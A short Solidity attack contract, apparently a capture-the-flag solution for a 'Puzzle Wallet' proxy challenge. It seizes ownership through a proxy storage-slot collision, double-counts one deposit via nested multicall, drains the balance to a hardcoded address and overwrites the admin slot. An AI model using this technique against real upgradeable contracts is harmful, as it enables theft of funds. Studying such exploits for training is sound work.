// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "../src/Puzzy.sol";
import {console, Script} from "forge-std/Script.sol";

contract Puzzy_exp{
    PuzzleWallet wallet;
    PuzzleProxy px;
    constructor(PuzzleWallet _wallet, PuzzleProxy _px) payable {
        wallet = _wallet;
        px = _px;
    }
    function attack() public payable {
        px.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));
        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory nestedSelectors = new bytes[](2);
        nestedSelectors[0] = abi.encodeWithSelector(wallet.deposit.selector);
        nestedSelectors[1] = abi.encodeWithSelector(wallet.multicall.selector,depositSelector);

        wallet.multicall{value: 0.001 ether}(nestedSelectors);

        address player = address(0x3CeE531D7d776D3370484A881bE380dEa317af9e);
        wallet.execute(player, 0.002 ether, "");

        wallet.setMaxBalance(uint256(uint160(player)));
    }




}